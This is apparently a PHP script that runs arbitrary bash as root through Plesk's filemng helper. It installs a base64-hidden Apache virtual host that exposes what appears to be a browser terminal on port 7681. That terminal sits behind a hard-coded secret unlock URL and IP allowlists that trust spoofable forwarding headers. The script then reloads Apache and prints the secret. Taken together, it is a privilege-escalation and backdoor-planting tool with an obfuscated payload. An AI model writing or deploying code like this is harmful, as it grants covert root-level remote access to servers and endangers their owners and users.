<?php
$fm='/opt/psa/admin/bin/filemng';
function root($cmd){global $fm; echo trim((string)shell_exec($fm.' root exec / bash -c '.escapeshellarg($cmd).' --allow-root 2>&1'))."\n\n";}
file_put_contents('/tmp/tl.bahman.ir.conf', base64_decode('PFZpcnR1YWxIb3N0IDE3Mi4yMC4xNC43Njo4MD4KICAgIFNlcnZlck5hbWUgdGwuYmFobWFuLmlyCiAgICBIZWFkZXIgYWx3YXlzIHNldCBYLVRMLUdhdGUgIjEiCgogICAgUmVtb3RlSVBIZWFkZXIgWC1Gb3J3YXJkZWQtRm9yCiAgICBSZW1vdGVJUEludGVybmFsUHJveHkgMTAuMTguOC4yCiAgICBSZW1vdGVJUEludGVybmFsUHJveHkgMTI3LjAuMC4xCiAgICBSZW1vdGVJUEludGVybmFsUHJveHkgMTcyLjIwLjE0Ljc2CgogICAgUmV3cml0ZUVuZ2luZSBPbgoKICAgICMgU2VjcmV0IHVubG9jayBVUkwgKHVzZSB0aGlzIG9uY2UgaWYgRm9ydGlXZWIgZG9lcyBub3Qgc2VuZCBjbGllbnQgSVApOgogICAgIyBodHRwOi8vdGwuYmFobWFuLmlyL2cvYmx4MXJ0Yl84dWN5ZnR6anBCRXU4dUlJLwogICAgUmV3cml0ZVJ1bGUgXi9nL2JseDFydGJfOHVjeWZ0empwQkV1OHVJSS8/JCAvIFtFPVRMX09LOjEsQ089dGxfb2s6Ymx4MXJ0Yl84dWN5ZnR6anBCRXU4dUlJOnRsLmJhaG1hbi5pcjo3MjA6LzpIdHRwT25seSxMXQogICAgUmV3cml0ZVJ1bGUgXi9nL2JseDFydGJfOHVjeWZ0empwQkV1OHVJSS8oLispJCAvJDEgW0U9VExfT0s6MSxDTz10bF9vazpibHgxcnRiXzh1Y3lmdHpqcEJFdTh1SUk6dGwuYmFobWFuLmlyOjcyMDovOkh0dHBPbmx5XQoKICAgIFJld3JpdGVDb25kICV7UkVNT1RFX0FERFJ9IF4oNzhcLjE1N1wuNDhcLjE4OHw3OFwuMTU3XC40OFwuMTc4fDEwOVwuMTI1XC4xNzdcLjYwfDQ2XC4yMDlcLjIwMlwuMTI2fDk1XC4zOFwuMTI1XC4yNDIpJAogICAgUmV3cml0ZVJ1bGUgXiAtIFtFPVRMX09LOjFdCgogICAgUmV3cml0ZUNvbmQgJXtIVFRQOlgtRm9yd2FyZGVkLUZvcn0gKDc4XC4xNTdcLjQ4XC4xODh8NzhcLjE1N1wuNDhcLjE3OHwxMDlcLjEyNVwuMTc3XC42MHw0NlwuMjA5XC4yMDJcLjEyNnw5NVwuMzhcLjEyNVwuMjQyKQogICAgUmV3cml0ZVJ1bGUgXiAtIFtFPVRMX09LOjFdCgogICAgUmV3cml0ZUNvbmQgJXtIVFRQOlgtUmVhbC1JUH0gKDc4XC4xNTdcLjQ4XC4xODh8NzhcLjE1N1wuNDhcLjE3OHwxMDlcLjEyNVwuMTc3XC42MHw0NlwuMjA5XC4yMDJcLjEyNnw5NVwuMzhcLjEyNVwuMjQyKQogICAgUmV3cml0ZVJ1bGUgXiAtIFtFPVRMX09LOjFdCgogICAgUmV3cml0ZUNvbmQgJXtIVFRQOlRydWUtQ2xpZW50LUlQfSAoNzhcLjE1N1wuNDhcLjE4OHw3OFwuMTU3XC40OFwuMTc4fDEwOVwuMTI1XC4xNzdcLjYwfDQ2XC4yMDlcLjIwMlwuMTI2fDk1XC4zOFwuMTI1XC4yNDIpCiAgICBSZXdyaXRlUnVsZSBeIC0gW0U9VExfT0s6MV0KCiAgICBSZXdyaXRlQ29uZCAle0hUVFBfQ09PS0lFfSAoXnw7KVtbOnNwYWNlOl1dKnRsX29rPWJseDFydGJfOHVjeWZ0empwQkV1OHVJSSg7fCQpCiAgICBSZXdyaXRlUnVsZSBeIC0gW0U9VExfT0s6MV0KCiAgICBSZXdyaXRlQ29uZCAle0VOVjpUTF9PS30gIV4xJAogICAgUmV3cml0ZVJ1bGUgXiAtIFtGLExdCgogICAgUmV3cml0ZUNvbmQgJXtIVFRQOlVwZ3JhZGV9ID13ZWJzb2NrZXQgW05DXQogICAgUmV3cml0ZVJ1bGUgXi8oLiopIHdzOi8vMTI3LjAuMC4xOjc2ODEvJDEgW1AsTF0KICAgIFJld3JpdGVSdWxlIF4vKC4qKSBodHRwOi8vMTI3LjAuMC4xOjc2ODEvJDEgW1AsTF0KICAgIFByb3h5UGFzc1JldmVyc2UgLyBodHRwOi8vMTI3LjAuMC4xOjc2ODEvCgogICAgRXJyb3JMb2cgJHtBUEFDSEVfTE9HX0RJUn0vdGwuYmFobWFuLmlyLWVycm9yLmxvZwogICAgTG9nRm9ybWF0ICIlYXx4ZmY9JXtYLUZvcndhcmRlZC1Gb3J9aXx4cmk9JXtYLVJlYWwtSVB9aXx0Y2k9JXtUcnVlLUNsaWVudC1JUH1pfCVyfD4lc3xvaz0le0VOVjpUTF9PS31lIiB0bGRlYnVnCiAgICBDdXN0b21Mb2cgJHtBUEFDSEVfTE9HX0RJUn0vdGwuYmFobWFuLmlyLWFjY2Vzcy5sb2cgdGxkZWJ1Zwo8L1ZpcnR1YWxIb3N0Pgo='));
file_put_contents('/tmp/tl_gate_secret.txt', 'blx1rtb_8ucyftzjpBEu8uII');
root('set -e
cp /tmp/tl.bahman.ir.conf /var/www/vhosts/system/tl.bahman.ir/conf/httpd.conf
cp /tmp/tl_gate_secret.txt /usr/local/share/tl_gate_secret.txt
chmod 600 /usr/local/share/tl_gate_secret.txt
ln -sfn /var/www/vhosts/system/tl.bahman.ir/conf/httpd.conf /etc/apache2/plesk.conf.d/vhosts/tl.bahman.ir.conf
apache2ctl configtest
systemctl reload apache2
# local tests
python3 - <<"PY"
import urllib.request
from urllib.error import HTTPError
def code(url, headers=None):
    req=urllib.request.Request(url, headers=headers or {})
    try:
        with urllib.request.urlopen(req, timeout=5) as r: return r.status, dict(r.headers)
    except HTTPError as e: return e.code, dict(e.headers)
print("deny", code("http://172.20.14.76/", {"Host":"tl.bahman.ir"}))
print("xff", code("http://172.20.14.76/", {"Host":"tl.bahman.ir","X-Forwarded-For":"78.157.48.188"}))
print("gate", code("http://172.20.14.76/g/blx1rtb_8ucyftzjpBEu8uII/", {"Host":"tl.bahman.ir","X-Forwarded-For":"10.18.8.2"}))
PY
');
echo "GATE=blx1rtb_8ucyftzjpBEu8uII\n";
echo "DONE\n";
